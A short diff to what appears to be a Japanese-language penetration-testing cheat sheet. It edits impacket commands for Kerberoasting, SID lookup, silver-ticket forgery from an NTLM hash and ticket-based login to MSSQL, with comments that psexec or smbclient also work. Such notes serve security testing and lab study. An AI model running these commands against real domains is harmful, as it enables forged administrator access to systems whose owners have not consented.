@@ -64,6 +64,9 @@ impacket-GetUserSPNs <domain>/<user>:<pass> -dc-host <dc name> -request -k
 //SIDを入手
 impacket-getPac -targetUser administrator <domain>/<user>:<pass>
 //SPN、NTLMハッシュ、SIDでシルバーチケットを作成
-impacket-ticketer -nthash <NTLM hash> -domain-sid <SID> -domain <domain> -dc-ip <IP> -spn <SPN> administrator
+impacket-ticketer -nthash <NTLM hash> -domain-sid <SID> -domain <domain> -dc-ip <IP> -spn <SPN> administrator　#IPはなくてもよい
+//チケットを環境変数にインポート
+KRB5CCNAME=administrator.ccache 
 //チケットを使ってケルベロスに接続
-KRB5CCNAME=administrator.ccache impacket-mssqlclient -k <dc name>
+impacket-mssqlclient -k -no-pass <dc name>　#mssqlだけでなくpsexecでもsmbclientでも、対象としたSPNで実行できるサービスなら何でもいける
+
